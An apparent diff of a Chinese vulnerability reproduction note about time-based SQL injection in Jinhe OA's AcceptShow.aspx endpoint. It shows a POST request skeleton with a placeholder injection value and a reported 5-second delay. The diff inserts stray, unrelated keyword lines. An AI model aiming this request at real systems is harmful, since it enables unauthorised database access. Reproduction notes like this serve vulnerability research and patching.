@@ -60,6 +60,14 @@ public static string GetFileID(string ModuleID, string ModuleMessageID)
 
 # 漏洞复现
 
+深入探索
+
+软件
+
+计算机服务器
+
+计算机安全
+
 ```
 POST /c6/Jhsoft.Web.AcceptAip/AcceptShow.aspx/ HTTP/1.1
 Host: jhsoft.mrxn.net
@@ -72,4 +80,4 @@ id=SQLI_POC
 
 成功延时 5 秒
 
-漏洞扫描服务
+数据管理
